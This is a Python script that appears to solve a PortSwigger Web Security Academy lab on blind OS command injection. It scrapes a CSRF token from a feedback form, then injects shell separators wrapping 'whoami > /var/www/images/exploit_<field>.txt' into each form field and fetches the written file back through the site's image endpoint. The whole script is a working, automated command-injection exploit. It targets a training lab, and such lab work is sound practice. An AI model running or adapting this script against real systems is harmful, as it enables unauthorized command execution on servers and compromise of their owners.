# https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

import requests
from lxml import html
from rich.console import Console
import typer

console = Console()


SERVER="https://0a9800a704d43178c0d269e400870057.web-security-academy.net"
ENDPOINT="/feedback/submit"

def injectable_params(server, session):
    
    response = session.get(f"{SERVER}/feedback")
    console.log(f"Get status code {response.status_code}")
    html_document = html.fromstring(response.content)
    csrf_token = html_document.xpath("//input[@name = 'csrf']/@value")[0]
    console.log(f"CSRF Token = {csrf_token}")
    
    separators = ["&&", "||", "&", "|", "`"]
    
 
    params = {
    "csrf": csrf_token, 
    "name": 'foo', 
    "email": 'foo@example.com',
    "subject": 'sbj',
    "message": 'this is a test message'
    }


    for key in params:
        if key != "csrf":
            console.rule("[bold red]"+key)
            tmp = params[key]
            for sep in separators:
                console.log("with separator "+sep+" :")
                injection = sep+'whoami > /var/www/images/exploit_'+key+'.txt'+sep
                params[key] = injection
                response=session.post(f"{server}{ENDPOINT}", data=params)

                console.log(f"Post status code {response.status_code}\n") 

                if response.status_code == 200:
                    response=requests.get(f"{server}/image?filename=exploit_"+key+".txt")
                    style = "bold white on blue"
                    console.print("Command Get response = "+ response.text, style=style, justify="left")

            params[key] = tmp
    


def main(server=SERVER):
    session = requests.Session()
    injectable_params(server, session)

if __name__ == "__main__":
    typer.run(main)